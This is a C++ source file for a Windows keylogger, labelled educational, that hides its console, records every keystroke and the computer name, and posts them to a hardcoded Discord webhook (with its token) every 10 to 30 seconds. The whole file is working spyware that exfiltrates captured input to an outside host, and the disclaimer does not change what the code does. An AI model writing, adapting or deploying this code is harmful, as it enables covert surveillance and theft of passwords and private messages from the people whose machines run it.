/**
 * @file main.cpp
 * @brief Main application entry point for educational keylogger
 * 
 * This is for EDUCATIONAL PURPOSES ONLY.
 * Unauthorized use of this code to monitor someone's activity without their
 * knowledge is illegal and unethical.
 */

// Standard includes
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <ctime>

// Windows-specific includes
#include <winsock2.h>
#include <windows.h>
#include <WinInet.h>

#pragma comment(lib, "wininet.lib")

// Project includes
#include "../include/KeyLogger.h"

class DiscordWebhook {
private:
    std::string webhookUrl;
    std::string username;
    
public:
    DiscordWebhook(const std::string& url) : webhookUrl(url) {
        username = "Keylogger Bot";
    }
    
    void setUsername(const std::string& name) {
        username = name;
    }
    
    void setContent(const std::string& content) {
        this->content = content;
    }
    
    bool execute() {
        try {
            // Extract host and path from webhook URL
            std::string host = "discord.com";
            std::string path;
            
            if (webhookUrl.find("https://discord.com/") != std::string::npos) {
                path = webhookUrl.substr(std::string("https://discord.com").length());
            } else {
                // If URL is malformed, use it as is
                path = webhookUrl;
            }
            
            // Create JSON payload
            std::string payload = "{\"username\":\"" + username + "\",\"content\":\"" + content + "\"}";
            
            // Use WinInet API for HTTP POST request
            HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) return false;
            
            HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (!hConnect) {
                InternetCloseHandle(hInternet);
                return false;
            }
            
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
            if (!hRequest) {
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return false;
            }
            
            // Set headers and send request
            const char* headers = "Content-Type: application/json\r\n";
            BOOL result = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)payload.c_str(), payload.size());
            
            // Cleanup
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            
            return result;
        }
        catch (...) {
            return false;
        }
    }
    
private:
    std::string content;
};

// Forward declaration
void LogKey(int key);
void SendToWebhook(const std::string& content);

// Global webhook instance
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1360228809407987934/mcsJkqcQirvnGHSc_b1_popvulGEfCi1IYUIFHfg1M1WrVDXnQUmEy7lOHzUY5x6Y3n4";
DiscordWebhook webhook(WEBHOOK_URL);

void SendToWebhook(const std::string& content) {
    webhook.setContent(content);
    webhook.execute();
}

void LogKey(int key) {
    static std::string buffer;
    static time_t lastSendTime = time(0);
    
    // Automatically send buffer after a certain time (10 seconds)
    time_t currentTime = time(0);
    if (difftime(currentTime, lastSendTime) >= 10 && !buffer.empty()) {
        SendToWebhook("Keystrokes: " + buffer);
        buffer.clear();
        lastSendTime = currentTime;
        return;
    }

    // Handle special key: Enter
    if (key == VK_RETURN) {
        buffer += "[ENTER]\n";
        SendToWebhook("Keystrokes: " + buffer);
        buffer.clear();
        lastSendTime = currentTime;
        return;
    }

    // Handle regular characters with proper conversion
    if (key >= 32 && key <= 126) {  // Printable ASCII
        char keyChar = static_cast<char>(key);
        
        // Handle shift key for uppercase and symbols
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
            // For letters, convert to uppercase
            if (key >= 'a' && key <= 'z') {
                keyChar = key - 32;  // Convert to uppercase
            } else {
                // Handle common shifted symbols
                switch (key) {
                    case '1': keyChar = '!'; break;
                    case '2': keyChar = '@'; break;
                    case '3': keyChar = '#'; break;
                    case '4': keyChar = '$'; break;
                    case '5': keyChar = '%'; break;
                    case '6': keyChar = '^'; break;
                    case '7': keyChar = '&'; break;
                    case '8': keyChar = '*'; break;
                    case '9': keyChar = '('; break;
                    case '0': keyChar = ')'; break;
                    case '-': keyChar = '_'; break;
                    case '=': keyChar = '+'; break;
                    case '[': keyChar = '{'; break;
                    case ']': keyChar = '}'; break;
                    case '\\': keyChar = '|'; break;
                    case ';': keyChar = ':'; break;
                    case '\'': keyChar = '"'; break;
                    case ',': keyChar = '<'; break;
                    case '.': keyChar = '>'; break;
                    case '/': keyChar = '?'; break;
                    case '`': keyChar = '~'; break;
                }
            }
        }
        buffer += keyChar;
    } else {
        // Handle special keys
        switch (key) {
            case VK_SPACE:
                buffer += " ";
                break;
            case VK_TAB:
                buffer += "[TAB]";
                break;
            case VK_BACK:
                buffer += "[BACKSPACE]";
                break;
            case VK_DELETE:
                buffer += "[DEL]";
                break;
            case VK_SHIFT:
                // Don't add shift to buffer, it's handled with other keys
                break;
            case VK_CONTROL:
                buffer += "[CTRL]";
                break;
            case VK_MENU: // ALT key
                buffer += "[ALT]";
                break;
            case VK_ESCAPE:
                buffer += "[ESC]";
                break;
            case VK_DOWN:
                buffer += "[DOWN]";
                break;
            case VK_UP:
                buffer += "[UP]";
                break;
            case VK_LEFT:
                buffer += "[LEFT]";
                break;
            case VK_RIGHT:
                buffer += "[RIGHT]";
                break;
            case VK_F1:
                buffer += "[F1]";
                break;
            case VK_F2:
                buffer += "[F2]";
                break;
            case VK_F3:
                buffer += "[F3]";
                break;
            case VK_F4:
                buffer += "[F4]";
                break;
            case VK_F5:
                buffer += "[F5]";
                break;
            case VK_F6:
                buffer += "[F6]";
                break;
            case VK_F7:
                buffer += "[F7]";
                break;
            case VK_F8:
                buffer += "[F8]";
                break;
            case VK_F9:
                buffer += "[F9]";
                break;
            case VK_F10:
                buffer += "[F10]";
                break;
            case VK_F11:
                buffer += "[F11]";
                break;
            case VK_F12:
                buffer += "[F12]";
                break;
        }
    }
}

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Set webhook username
    webhook.setUsername("Keylogger Bot");
    
    // Send initial message
    SendToWebhook("Keylogger started on " + std::string(getenv("COMPUTERNAME")));
    
    // Main keylogging loop with periodic sending
    std::string buffer;
    time_t lastSendTime = time(0);
    
    // Main keylogging loop
    while(true) {
        Sleep(10);
        
        // Auto-send every 30 seconds regardless of keystrokes
        time_t currentTime = time(0);
        if (difftime(currentTime, lastSendTime) >= 30) {
            if (!buffer.empty()) {
                SendToWebhook("Timed keylog update: " + buffer);
                buffer.clear();
            } else {
                SendToWebhook("Keylogger still active on " + std::string(getenv("COMPUTERNAME")));
            }
            lastSendTime = currentTime;
        }
        
        // Check for keystrokes
        for(int i = 8; i <= 255; i++) {
            if(GetAsyncKeyState(i) & 0x1) { // Changed to 0x1 to capture key press once
                LogKey(i);
            }
        }
    }
    
    return 0;
} 